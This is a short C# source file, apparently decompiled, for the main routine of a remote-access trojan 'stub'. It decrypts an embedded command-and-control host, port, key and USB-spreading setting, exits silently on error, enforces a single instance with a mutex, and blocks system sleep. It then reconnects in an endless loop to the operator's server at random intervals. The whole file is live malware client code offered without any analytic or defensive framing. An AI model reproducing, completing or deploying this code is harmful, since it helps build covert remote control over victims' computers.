using System;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

namespace Stub;

public class Main
{
	[STAThread]
	public static void Main()
	{
		Thread.Sleep(checked(Settings.Sleep * 1000));
		try
		{
			Settings.Host = Conversions.ToString(AlgorithmAES.Decrypt(Settings.Host));
			Settings.Port = Conversions.ToString(AlgorithmAES.Decrypt(Settings.Port));
			Settings.KEY = Conversions.ToString(AlgorithmAES.Decrypt(Settings.KEY));
			Settings.SPL = Conversions.ToString(AlgorithmAES.Decrypt(Settings.SPL));
			Settings.USBNM = Conversions.ToString(AlgorithmAES.Decrypt(Settings.USBNM));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Environment.Exit(0);
			ProjectData.ClearProjectError();
		}
		if (!Helper.CreateMutex())
		{
			Environment.Exit(0);
		}
		Helper.PreventSleep();
		Thread thread = new Thread((ThreadStart)delegate
		{
			Helper.LastAct();
		});
		Thread thread2 = new Thread((ThreadStart)delegate
		{
			while (true)
			{
				Thread.Sleep(new Random().Next(3000, 10000));
				if (!ClientSocket.isConnected)
				{
					ClientSocket.isDisconnected();
					ClientSocket.BeginConnect();
				}
				ClientSocket.allDone.WaitOne();
			}
		});
		thread.Start();
		thread2.Start();
		thread2.Join();
	}
}
